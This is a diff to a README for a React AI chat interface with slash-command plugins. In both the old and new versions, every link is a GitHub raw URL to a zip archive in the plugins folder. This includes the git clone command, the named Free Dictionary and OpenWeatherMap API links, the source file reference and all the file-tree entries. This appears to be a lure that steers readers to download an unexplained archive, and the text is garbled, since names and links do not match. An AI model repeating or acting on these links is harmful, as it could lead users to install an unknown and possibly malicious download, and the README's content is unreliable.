@@ -23,7 +23,7 @@ A sleek AI chat interface built with React that supports plugin-style tools usin
 ### 1. **Clone the Repository**
 
 ```bash
-git clone https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
+git clone https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
 cd ai-chat-plugins
 ```
 
@@ -65,7 +65,7 @@ const samplePlugin = {
 ### 🔍 Parsing Logic
 
 1. **Input Command** (e.g., `/calc 5+3`)
-2. **`handleCommand(input)`** in `https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip`:
+2. **`handleCommand(input)`** in `https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip`:
    - Iterates through available plugins
    - Matches the `trigger` regex
    - Executes the matched plugin
@@ -86,13 +86,13 @@ const samplePlugin = {
 
 - **Command**: `/define ephemeral`
 - **Function**: Fetches the definition of a word
-- **API Used**: [Free Dictionary API](https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip)
+- **API Used**: [Free Dictionary API](https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip)
 
 ### 3. `/weather` – Weather Info
 
 - **Command**: `/weather Mumbai`
 - **Function**: Shows current weather for a city
-- **API Used**: [OpenWeatherMap API](https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip)
+- **API Used**: [OpenWeatherMap API](https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip)
   - You’ll need an API key[VITE_OPENWEATHERMAP_API_KEY]. Store it securely (e.g., `.env`)
 
 ---
@@ -103,24 +103,24 @@ const samplePlugin = {
 src/
 │
 ├── components/
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   └── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   └── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
 │
 ├── context/
-|   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
+|   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
 |
 ├── plugins/
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   ├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-│   └── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   ├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+│   └── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
 │
 |
-├── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
-└── https://raw.githubusercontent.com/Anmol-Jha-20/AI-Chat-Interface/main/src/plugins/A-Chat-Interface-2.4.zip
+├── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
+└── https://github.com/Anmol-Jha-20/AI-Chat-Interface/raw/refs/heads/main/src/plugins/Interface-Chat-A-v3.5.zip
 ```
 
 ---
